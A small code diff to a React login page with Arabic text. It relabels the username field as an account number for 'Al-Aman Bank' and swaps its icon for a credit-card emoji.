@@ -53,7 +53,7 @@ export default function LoginPage() {
 
   const validate = (u: string, p: string) => {
     const e: { username?: string; password?: string } = {};
-    if (!u.trim()) e.username = "اسم المستخدم مطلوب";
+    if (!u.trim()) e.username = "رقم الحساب مطلوب";
     if (!p) e.password = "كلمة المرور مطلوبة";
     else if (p.length < 4)
       e.password = "كلمة المرور يجب أن تكون 4 أحرف على الأقل";
@@ -358,12 +358,12 @@ export default function LoginPage() {
                     fontSize: 16,
                   }}
                 >
-                  🧑
+                  💳
                 </div>
                 <input
                   type="text"
                   value={username}
-                  placeholder="اسم المستخدم"
+                  placeholder="رقم الحساب الخاص بمصرف الامان"
                   onChange={(e) => {
                     setUsername(e.target.value);
                     if (touched.username)
